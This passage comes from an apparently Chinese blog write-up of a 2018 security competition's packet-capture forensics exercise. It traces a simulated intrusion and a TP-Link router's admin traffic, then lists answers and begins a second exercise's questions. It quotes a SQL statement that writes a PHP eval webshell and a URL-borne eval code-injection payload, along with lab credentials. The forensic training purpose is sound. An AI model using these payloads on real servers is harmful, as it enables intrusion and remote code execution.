class="hljs-string">&#x27;c:/phpStudy/WWW/config/config.php&#x27;</span><br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">select &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>来写马</p><p>后面是路由器的流量分析，没接触过。。</p><p>不过路由器一般是作为网关的而且一般都有一个<code>Web</code>管理界面。<br>当务之急是找到网关<code>IP</code>,</p><p>直接过滤一下<code>arp</code>。</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/15.png" alt="15"></p><p>这就得到了网关<code>IP 192.168.0.1</code></p><p>尝试过滤</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>没有发现</p><p>尝试在其他数据包查找,<br>在第一个数据包中找到了<code>1.99</code>对<code>0.1</code>的http访问流量<br>要对路由器进行管理的话，一般是需要登录一下的，管理界面是在登录之后，往后找找</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/16.png" alt="16"></p><p>可以看到在这里登录成功了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;id&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">&quot;result&quot;</span>:&#123; <span class="hljs-attr">&quot;locale&quot;</span>:<span class="hljs-string">&quot;zh_CN&quot;</span>, <span class="hljs-attr">&quot;force&quot;</span>:<span class="hljs-literal">false</span>, <span class="hljs-attr">&quot;radio&quot;</span>:<span class="hljs-number">2</span>, <span class="hljs-attr">&quot;model&quot;</span>:<span class="hljs-string">&quot;TL-WAR1300L v1.0&quot;</span> &#125;, <span class="hljs-attr">&quot;error_code&quot;</span>:<span class="hljs-string">&quot;0&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>从返回的<code>json</code>数据中，可以获得路由器的<code>model</code>值是<code>TL-WAR1300L v1.0</code></p><p>后面又问了路由器的所有<code>IP</code>地址,在他的<code>Web</code>管理界面应该可以找到。<br>继续往下翻</p><p>从请求来看，这个路由器管理界面通过<code>JS</code>来实现的动态页面，使用<code>json</code>来作为与服务器之间的信息传输格式。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">No</span>.<span class="hljs-number">433619</span><br><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">1812</span><br><span class="hljs-attribute">lan</span>.js<br><br><span class="hljs-attribute">No</span>.<span class="hljs-number">435490</span><br><span class="hljs-attribute">setting</span>.js<br><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">1843</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">No.<span class="hljs-number">482107</span><br>POST <span class="hljs-regexp">/webpages/</span>data<span class="hljs-regexp">/advanced.menu.json HTTP/</span><span class="hljs-number">1.1</span>\r\n<br></code></pre></td></tr></table></figure><p><code>No.483716</code></p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/17.png" alt="17"></p><p>追踪一下，查看一下返回的<code>json</code>数据</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: &#123;<br>​        <span class="hljs-string">&quot;normal&quot;</span>: [<br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;202.1.1.1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;WAN1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.12.173&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;internet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;dhcp&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN2&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">false</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN3&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;disconnect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;<br>​        ]<br>​    &#125;, <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可知路由器的<code>WAN1`` WAN2`` LAN1`` LAN2 </code>已经连接<br>IP地址分别为</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">202.1.1.1</span><br><span class="hljs-number">192.168.12.173</span><br><span class="hljs-number">192.168.0.1</span><br></code></pre></td></tr></table></figure><p>再往下</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/18.png" alt="18"></p><p>在<code>lan.js</code>中可以查到<br>涉及端口监控的都携带有<code>MONITOR</code></p><p>经过查找可知在<code>advanced.menu.json</code>中有<br><code>port-monitor</code>这一项</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/19.png" alt="19"></p><p>路由器拥有五个接口</p><p>再看第17题,一般来说，路由器的端口监控，就是端口镜像，将多个端口的流量转发到一个端口上来实现对流量的监控</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/20.png" alt="20"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;id&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">&quot;result&quot;</span>:&#123; <span class="hljs-attr">&quot;state&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>, <span class="hljs-attr">&quot;mode&quot;</span>:<span class="hljs-string">&quot;both&quot;</span>, <span class="hljs-attr">&quot;mirroredports&quot;</span>:[ <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span> ], <span class="hljs-attr">&quot;mirrorport&quot;</span>:<span class="hljs-string">&quot;3&quot;</span> &#125;, <span class="hljs-attr">&quot;error_code&quot;</span>:<span class="hljs-string">&quot;0&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>可知3号端口是1号和2号的镜像，也就是<code>3-&gt;1,2</code></p><p>接下来要找系统路由表</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;route&quot;</span>  <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>根据URL猜测为最后一条.</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/21.png" alt="21"></p><p>追踪一下<code>TCP</code>流</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: [<br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;192.168.12.254&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;127.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;lo&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.252.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;192.168.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;LAN&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.255.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;192.168.12.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.255.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;202.1.1.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN1&quot;</span><br>​        &#125;<br>​    ], <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可知第三条的子网掩码是<code>255.255.252.0</code></p><p>然后要找<code>5Gwifi</code>..</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;5G&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/22.png" alt="22"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: &#123;<br>​        <span class="hljs-string">&quot;0&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;test-ge1&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;wds&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;channel&quot;</span>: <span class="hljs-number">1</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11bgn mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">1</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;2.4G&quot;</span><br>​        &#125;, <br>​        <span class="hljs-string">&quot;1&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;test-ge1&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;wds&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;channel&quot;</span>: <span class="hljs-number">36</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11anac mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;5G&quot;</span><br>​        &#125;, <br>​        <span class="hljs-string">&quot;2&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;TP-LINK_GUEST_6258&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11bgn mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;visitor&quot;</span><br>​        &#125;<br>​    &#125;, <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以最后一题答案为<code>test-ge136</code></p><h2 id="4-最后答案"><a href="#4-最后答案" class="headerlink" title="4. 最后答案"></a>4. 最后答案</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.黑客的IP是多少<br><span class="hljs-number">202.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-number">2</span>.服务器<span class="hljs-number">1.99</span>的web服务器使用的CMS及其版本号(请直接复制)<br>EasyTalk X2.<span class="hljs-number">0.1</span><br><span class="hljs-number">3</span>.服务器拿到的webshell的网址(请输入url解码后的网址)<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">202.1</span>.<span class="hljs-number">1.1</span><span class="hljs-regexp">/index.php/m</span>odule<span class="hljs-regexp">/action/</span>param1/<span class="hljs-variable">$&#123;@print(eval($_POST[c]))&#125;</span><br><span class="hljs-number">4</span>.服务器<span class="hljs-number">1.99</span>的主机名<br>simplefight1<br><span class="hljs-number">5</span>.网站根目录的绝对路径(注意最后加斜杠)<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/<br><span class="hljs-number">6</span>.黑客上传的第一个文件名称是什么<br>scan.php<br><span class="hljs-number">7</span>.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)<br><span class="hljs-number">21</span>,<span class="hljs-number">80</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">3306</span><br><span class="hljs-number">8</span>.服务器<span class="hljs-number">2.88</span>的ftp服务账号密码(格式：账号/密码)<br>administrator/<span class="hljs-number">123456</span><br><span class="hljs-number">9</span>.黑客成功登陆ftp的时间(格式：<span class="hljs-number">10</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span>)<br><span class="hljs-number">14</span>:<span class="hljs-number">07</span>:<span class="hljs-number">15</span><br><span class="hljs-number">10</span>.黑客在ftp中下载的敏感文件名称是什么<br>config_db.php<br><span class="hljs-number">11</span>.服务器<span class="hljs-number">2.88</span>中用户名为admin_zz的web后台管理员的密码<br><span class="hljs-number">1</span>q2w3e4r<br><span class="hljs-number">12</span>.服务器<span class="hljs-number">2.88</span>的mysql账号密码(格式：账号/密码)<br>localhost/S1mp13zz<br><span class="hljs-number">13</span>.服务器<span class="hljs-number">2.88</span>的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔<br>met_admin_array,met_admin_column,met_admin_table<br><span class="hljs-number">14</span>.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)<br>c:<span class="hljs-regexp">/phpStudy/</span>WWW<span class="hljs-regexp">/config/</span>config.php<br><span class="hljs-number">15</span>.路由器的品牌、型号、版本(请直接复制粘贴)<br>TL-WAR1300L v1.<span class="hljs-number">0</span><br><span class="hljs-number">16</span>.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)<br><span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">12.173</span>,<span class="hljs-number">202.1</span>.<span class="hljs-number">1.1</span><br><span class="hljs-number">17</span>.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，<span class="hljs-number">1</span>号端口监控<span class="hljs-number">2</span><span class="hljs-regexp">/3/</span><span class="hljs-number">4</span>号端口:<span class="hljs-number">1</span>—&gt;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-number">3</span>-&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span><br><span class="hljs-number">18</span>.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)<br><span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span><br><span class="hljs-number">19</span>.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: <span class="hljs-number">255</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">0</span>则为<span class="hljs-number">24</span> (格式:用英文逗号分隔)<br><span class="hljs-number">255.255</span>.<span class="hljs-number">252.0</span><br><span class="hljs-number">20</span>.路由器的<span class="hljs-number">5</span>Gwif名称是什么，信道是多少(格式:名称信道)<br>test-ge136<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据包分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018.5.5-铁人三项赛数据赛数据包分析</title>
    <link href="/2018/12/03/2018-5-5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <url>/2018/12/03/2018-5-5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>5月5号 信息安全铁人三项赛分区赛数据包分析练习</p><a id="more"></a><h2 id="1-数据包下载链接"><a href="#1-数据包下载链接" class="headerlink" title="1. 数据包下载链接"></a>1. 数据包下载链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接: https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>SaZXgD-qb5Z54jKZVE--Lg 提取码: dhv6 <br></code></pre></td></tr></table></figure><h2 id="2-题目"><a href="#2-题目" class="headerlink" title="2. 题目"></a>2. 题目</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.黑客攻击的第一个受害主机的网卡<span class="hljs-built_in">IP</span>地址<br><span class="hljs-number">2</span>.黑客对URL的哪一个参数实施了SQL注入<br><span class="hljs-number">3</span>.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)<br><span class="hljs-number">4</span>.第一个受害主机网站数据库的名字<br><span class="hljs-number">5</span>.Joomla后台管理员的密码是多少<br><span class="hljs-number">6</span>.黑客第一次获得的php木马的密码是什么<br><span class="hljs-number">7</span>.黑客第二次上传php木马是什么时间<br><span class="hljs-number">8</span>.第二次上传的木马通过HTTP协议中的哪个头传递数据<br><span class="hljs-number">9</span>.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br><span class="hljs-number">10</span>.php代理第一次被使用时最先连接了哪个<span class="hljs-built_in">IP</span>地址<br><span 